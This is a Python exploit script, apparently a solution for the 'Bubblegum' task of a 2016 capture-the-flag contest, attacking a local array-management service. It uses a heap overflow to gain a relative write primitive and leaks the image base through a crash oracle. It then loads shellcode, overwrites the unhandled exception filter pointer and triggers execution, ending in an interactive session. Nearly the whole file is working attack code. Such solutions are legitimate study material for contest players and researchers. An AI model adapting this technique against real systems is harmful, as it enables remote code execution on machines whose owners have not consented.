#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Filename:         exploit.py
# Author:           Mateusz Jurczyk
# Task:             Bubblegum
# Competition:      Teaser CONFidence CTF 2016
# Category:         Software exploitation
# Scoring:          500 pts (hard)
# Number of solves: 0 out of 44 teams (1 after the end of the CTF)

import os
import random
import sys
import struct
import socket
import string
import telnetlib
import time

def read_until(s, text):
  buffer = ""
  while len(buffer) < len(text):
    buffer += s.recv(1)
  while buffer[-len(text):] != text:
    buffer += s.recv(1)
  return buffer[:-len(text)]

def db(x):
  return struct.pack("B", x)

def dd(x):
  return struct.pack("<I", x)

def create_supplied_compact_array(s, tag, elems, width, data):
  s.sendall("1\n")
  s.sendall((dd(tag) + db(elems) + db(width) + data).encode("hex") + "\n")
  s.recv(4096)

def create_empty_compact_array(s, tag):
  s.sendall("2\n")
  s.sendall("%d\n" % tag)
  s.recv(4096)

def push_element_to_compact_array(s, tag, value):
  s.sendall("3\n")
  s.sendall("%d\n%d\n" % (tag, value))
  s.recv(4096)

def set_element_at_offset(s, tag, index, value):
  s.sendall("5\n")
  s.sendall("%d\n%d\n%d\n" % (tag, index, value))
  s.recv(4096)

def set_compact_array_item_range(s, tag, start_idx, end_idx, value):
  s.sendall("6\n")
  s.sendall("%d\n%d\n%d\n%d\n" % (tag, start_idx, end_idx, value))
  s.recv(4096)

def print_array(s, tag):
  s.sendall("7\n")
  s.sendall("%d\n" % tag)
  s.recv(4096)

def remove_compact_array(s, tag):
  s.sendall("9\n")
  s.sendall("%d\n" % tag)
  s.recv(4096)

def main():
  print "---------- FIRST STAGE: Leak the 1st most significant byte of the image base."

  # Connect to remote host.
  s = socket.socket()
  s.connect(("127.0.0.1", 4141))

  # Create a huge array with tag 0x7f000000, which will be used to disclose the
  # most significant byte of the base address.
  #
  # The tag is designed such that the min_bound value of the overwritten SafeBuffer
  # is 000000xx, where xx is the disclosed byte. It is so large because we are testing
  # the value using the "set" operator, resulting in overwriting memory directly past
  # the stored image base.
  create_supplied_compact_array(s, tag = 0x7f000000, elems = 255, width = 4, data = "\xaa\xbb\xcc\xdd" * 255)

  # Create an allocation with 10 0x03 bytes, which will later be reused as the
  # width of a new compact array.
  create_supplied_compact_array(s, tag = 0, elems = 10, width = 1, data = "\x03" * 10)

  # Remove the filler array.
  remove_compact_array(s, tag = 0)

  # Create two new, empty arrays. The second one will have width set to 3.
  create_empty_compact_array(s, tag = 0)
  create_empty_compact_array(s, tag = 0)

  # Remove the first array, leaving only the one with width=3.
  remove_compact_array(s, tag = 0)

  # Add two elements at the end of the array.
  push_element_to_compact_array(s, tag = 0, value = 1)
  push_element_to_compact_array(s, tag = 0, value = 2)

  # Create a new, empty array with tag=1.
  create_empty_compact_array(s, tag = 1)

  # Push a 8-bit wide value at the end of array #1.
  push_element_to_compact_array(s, tag = 1, value = 0x11)

  # Perform the "memset" action on array #0, passing indexes 0 and 1, which will
  # result in a 8-byte overflow of the bounds of array #1.
  #
  # The assignment of a three-byte 0xaabbcc value into the
  # [lower_bound, upper_bound] structure is as follows:
  #
  # 0xbbccaabb 0xaabbccaa
  #
  # Therefore, we're using the 0x7f80ff value, which results in:
  #  - lower_bound = 0x80ff7f80 (very small value)
  #  - upper_bound = 0x7f80ff7f (very large value)
  #
  # Thanks to this, we get a nearly arbitrary, relative write primitive.
  set_compact_array_item_range(s, tag = 0, start_idx = 0, end_idx = 1, value = 0x7f80ff)

  # Create a new array, whose SafeBuffer* pointer will be overwritten to partially
  # point into the image base address being leaked.
  create_supplied_compact_array(s, tag = 2, elems = 1, width = 1, data = "\xcc")

  # Array #2 is now at address 0x????0424, and the SafeBuffer of array #1 which
  # we can use for arbitrary writes at 0x????044e. We actually want to redirect
  # the pointer to 0x????0003, which is the address of the last byte of the base
  # address.
  set_element_at_offset(s, tag = 1, index = (0x0424 + 8) - (0x044e + 8), value = 0x03)
  set_element_at_offset(s, tag = 1, index = (0x0424 + 8 + 1) - (0x044e + 8), value = 0x00)

  # Try setting bytes at descending offsets 0xff => 0x00 using the array with the
  # overwritten SafeBuffer* pointer, whose min_bound points at the most significant
  # byte of the image base. Once the connection is dropped, we know that the tested
  # offset was smaller than the disclosed byte, and hence we get to know the byte
  # itself. If we reach the end of the loop without a disconnect, the disclosed
  # byte is 0.
  tested_byte = 0xfe
  try:
    while tested_byte >= 0:

      sys.stdout.write("[+] Testing byte %.2x\r" % tested_byte)
      set_element_at_offset(s, tag = 2, index = tested_byte, value = 0x22)
      
      print_array(s, tag = 1)
      time.sleep(0.1)
      data = s.recv(4096)

      if len(data) == 0:
        raise Exception("no data")

      tested_byte -= 1

  except:
    disclosed_byte_1 = tested_byte + 1
  else:
    disclosed_byte_1 = 0

  print "\n[+] Disclosed byte: %.2x" % disclosed_byte_1
  s.close()

  print "---------- SECOND STAGE: Leak the 2nd most significant byte of the image base."

  # Connect to remote host.
  s = socket.socket()
  s.connect(("127.0.0.1", 4141))

  # Create a huge array with tag 0x7f000000, which will be used to disclose the
  # second most significant byte of the base address.
  #
  # The tag is designed such that the min_bound value of the overwritten SafeBuffer
  # is 0000yyxx, where yy is 0 (overwritten most significant byte of the image base
  # address), and xx is the disclosed byte. It is so large because we are testing
  # the value using the "set" operator, resulting in overwriting memory directly past
  # the stored image base.
  create_supplied_compact_array(s, tag = 0x7f7f0000, elems = 255, width = 4, data = "\xaa\xbb\xcc\xdd" * 255)

  # Create an allocation with 10 0x03 bytes, which will later be reused as the
  # width of a new compact array.
  create_supplied_compact_array(s, tag = 0, elems = 10, width = 1, data = "\x03" * 10)

  # Remove the filler array.
  remove_compact_array(s, tag = 0)

  # Create two new, empty arrays. The second one will have width set to 3.
  create_empty_compact_array(s, tag = 0)
  create_empty_compact_array(s, tag = 0)

  # Remove the first array, leaving only the one with width=3.
  remove_compact_array(s, tag = 0)

  # Add two elements at the end of the array.
  push_element_to_compact_array(s, tag = 0, value = 1)
  push_element_to_compact_array(s, tag = 0, value = 2)

  # Create a new, empty array with tag=1.
  create_empty_compact_array(s, tag = 1)

  # Push a 8-bit wide value at the end of array #1.
  push_element_to_compact_array(s, tag = 1, value = 0x11)

  # Perform the "memset" action on array #0, passing indexes 0 and 1, which will
  # result in a 8-byte overflow of the bounds of array #1.
  #
  # The assignment of a three-byte 0xaabbcc value into the
  # [lower_bound, upper_bound] structure is as follows:
  #
  # 0xbbccaabb 0xaabbccaa
  #
  # Therefore, we're using the 0x7f80ff value, which results in:
  #  - lower_bound = 0x80ff7f80 (very small value)
  #  - upper_bound = 0x7f80ff7f (very large value)
  #
  # Thanks to this, we get a nearly arbitrary, relative write primitive.
  set_compact_array_item_range(s, tag = 0, start_idx = 0, end_idx = 1, value = 0x7f80ff)

  # Create a new array, whose SafeBuffer* pointer will be overwritten to partially
  # point into the image base address being leaked.
  create_supplied_compact_array(s, tag = 2, elems = 1, width = 1, data = "\xcc")

  # Array #2 is now at address 0x????0424, and the SafeBuffer of array #1 which
  # we can use for arbitrary writes at 0x????044e. We want to first overwrite the
  # byte at 0x????0003 to 0 (because we already know its value and it would be an
  # obstacle for leaking the one at 0x????0002), and then redirect the pointer to
  # 0x????0002, which is the address of the second last byte of the base address.
  set_element_at_offset(s, tag = 1, index = 0x0003 - (0x044e + 8), value = 0x00)
  set_element_at_offset(s, tag = 1, index = (0x0424 + 8) - (0x044e + 8), value = 0x02)
  set_element_at_offset(s, tag = 1, index = (0x0424 + 8 + 1) - (0x044e + 8), value = 0x00)

  # Try setting bytes at descending offsets 0xff => 0x00 using the array with the
  # overwritten SafeBuffer* pointer, whose min_bound points at the most significant
  # byte of the image base. Once the connection is dropped, we know that the tested
  # offset was smaller than the disclosed byte, and hence we get to know the byte
  # itself. If we reach the end of the loop without a disconnect, the disclosed
  # byte is 0.
  tested_byte = 0xfe
  try:
    while tested_byte >= 0:

      sys.stdout.write("[+] Testing byte %.2x\r" % tested_byte)
      set_element_at_offset(s, tag = 2, index = tested_byte, value = 0x22)
      
      print_array(s, tag = 1)
      time.sleep(0.1)
      data = s.recv(4096)

      if len(data) == 0:
        raise Exception("no data")

      tested_byte -= 1

  except:
    disclosed_byte_2 = tested_byte + 1
  else:
    disclosed_byte_2 = 0

  print "\n[+] Disclosed byte: %.2x" % disclosed_byte_2

  IMAGEBASE = (disclosed_byte_1 << 24) | (disclosed_byte_2 << 16)
  print "[+] bubblegum.exe image base: %x" % IMAGEBASE

  s.close()

  print "---------- THIRD AND FINAL STAGE: Get flag."

  # Connect to remote host.
  s = socket.socket()
  s.connect(("127.0.0.1", 4141))

  # Create an allocation with 10 0x03 bytes, which will later be reused as the
  # width of a new compact array.
  create_supplied_compact_array(s, tag = 0, elems = 10, width = 1, data = "\x03" * 10)

  # Remove the filler array.
  remove_compact_array(s, tag = 0)

  # Create two new, empty arrays. The second one will have width set to 3.
  create_empty_compact_array(s, tag = 0)
  create_empty_compact_array(s, tag = 0)

  # Remove the first array, leaving only the one with width=3.
  remove_compact_array(s, tag = 0)

  # Add two elements at the end of the array.
  push_element_to_compact_array(s, tag = 0, value = 1)
  push_element_to_compact_array(s, tag = 0, value = 2)

  # Create a new, empty array with tag=1.
  create_empty_compact_array(s, tag = 1)

  # Push a 8-bit wide value at the end of array #1.
  push_element_to_compact_array(s, tag = 1, value = 0x11)

  # Perform the "memset" action on array #0, passing indexes 0 and 1, which will
  # result in a 8-byte overflow of the bounds of array #1.
  #
  # The assignment of a three-byte 0xaabbcc value into the
  # [lower_bound, upper_bound] structure is as follows:
  #
  # 0xbbccaabb 0xaabbccaa
  #
  # Therefore, we're using the 0x7f80ff value, which results in:
  #  - lower_bound = 0x80ff7f80 (very small value)
  #  - upper_bound = 0x7f80ff7f (very large value)
  #
  # Thanks to this, we get a nearly arbitrary, relative write primitive.
  set_compact_array_item_range(s, tag = 0, start_idx = 0, end_idx = 1, value = 0x7f80ff)

  # Create array #2 whose SafeBuffer* pointer we will overwrite in order to shift
  # it, such that we can read the contents of adjacent compact array and leak the
  # address of its own SafeBuffer*. From this, we can derive the base address of
  # the custom allocator region.
  create_supplied_compact_array(s, tag = 2, elems = 10, width = 4, data = ("\x00" * 4 + "\x7f" * 4) * 5)

  # Create array #3, whose contents we will disclose by overwriting the SafeBuffer*
  # of array #2.
  create_supplied_compact_array(s, tag = 2, elems = 1, width = 1, data = "\xdd")

  # Array #2 is now at address 0x????0010, and the its SafeBuffer which we will
  # shift to disclose the allocator region address is at 0x????0047. Shifting by
  # 4 dwords should be enough to read the SafeBuffer* pointer in the adjacent 
  # compact array allocation, so we'll set it to 0x????0057.
  set_element_at_offset(s, tag = 1, index = (0x0010 + 8) - (0x003a + 8), value = 0x57)

  # Print array #2, which will leak the address of array's #3 SafeBuffer*, which
  # is at 0x????0087. Extract the base address of the allocator's memory region
  # from that.
  print_array(s, tag = 2)
  read_until(s, "200000001010000")
  ALLOCBASE = struct.unpack("<I", s.recv(8).decode("hex"))[0] - 0x87

  print "[+] Leaked allocator memory base: %x" % ALLOCBASE

  # Load the shellcode and insert it into array #4. The corresponding SafeBuffer
  # will be placed at 0x????00a0, so the actual payload will be at 0x????00a8.
  with open("shellcode", "rb") as f:
    shellcode = f.read()

  create_supplied_compact_array(s, tag = 4, elems = len(shellcode), width = 1, data = shellcode)

  SHELLCODE_ADDR = ALLOCBASE + 0xa8

  # Overwrite the top level unhandled exception filter function pointer with the
  # address of the shellcode.
  EXCP_HANDLER_PTR_OFFSET = 0x30D7C
  set_element_at_offset(s, tag = 1, index = (IMAGEBASE + EXCP_HANDLER_PTR_OFFSET + 0) - (ALLOCBASE + 0x003a + 8), value = SHELLCODE_ADDR & 0xff)
  set_element_at_offset(s, tag = 1, index = (IMAGEBASE + EXCP_HANDLER_PTR_OFFSET + 1) - (ALLOCBASE + 0x003a + 8), value = (SHELLCODE_ADDR >> 8) & 0xff)
  set_element_at_offset(s, tag = 1, index = (IMAGEBASE + EXCP_HANDLER_PTR_OFFSET + 2) - (ALLOCBASE + 0x003a + 8), value = (SHELLCODE_ADDR >> 16) & 0xff)
  set_element_at_offset(s, tag = 1, index = (IMAGEBASE + EXCP_HANDLER_PTR_OFFSET + 3) - (ALLOCBASE + 0x003a + 8), value = (SHELLCODE_ADDR >> 24) & 0xff)

  # Receive any potentially remaining data before we trigger the bug itself and
  # read the flag.
  time.sleep(1.0)
  s.recv(4096)

  # Trigger an exception in order to have the overwritten pointer called and
  # shellcode executed.
  set_element_at_offset(s, tag = 1, index = 0x80808080, value = 0x00)

  # Switch to interactive mode.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

if __name__ == "__main__":
  main()
